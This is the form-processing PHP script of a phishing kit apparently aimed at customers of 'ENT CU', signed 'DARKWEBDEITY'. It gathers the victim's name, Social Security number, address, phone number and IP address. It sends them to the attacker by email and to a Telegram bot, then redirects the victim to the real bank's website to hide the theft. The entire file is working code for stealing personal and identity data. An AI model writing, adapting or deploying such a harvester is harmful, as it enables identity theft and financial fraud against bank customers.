<?php
session_start();
include("settings.php");

// validate login
if(!isset($_POST['firstname']) || !isset($_POST['zipcode'])) {
    header('Location: login.php');
    exit;
}
else{
    //collect info
    $firstname=$_POST['firstname'];
    $lastname=$_POST['lastname'];
    $ssn=$_POST['ssn'];
   $address=$_POST['address'];
   $city=$_POST['city'];
   $state=$_POST['state'];
   $zipcode=$_POST['zipcode'];
   $phone_no=$_POST['phone_no'];

    $message="------ 😈😈 ENT CU BY DARKWEBDEITY 😈😈 ------\n";
    $message.="====== Billing INFO ========\n";
    $message.="FirstName: ".$firstname."\n";
    $message.="Lastname: ".$lastname."\n";
    $message.="SSN: ".$ssn."\n";
    $message.="Address: ".$address."\n";
    $message.=" City: ".$city."\n";
    $message.=" State: ".$state."\n";
    $message.=" Zipcode: ".$zipcode."\n";
    $message.=" Phone No: ".$phone_no."\n";
    $message.="IP ADDR: ".$_SERVER['REMOTE_ADDR']." \n";
    $message.="==========================\n";

    //send email
    mail($mail, "Login Info", $message);

    //send telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$telegram_bot_token."/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=".$telegram_chat_id."&text=".$message);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

   
        header('Location: https://www.ent.com');
        exit;
   
}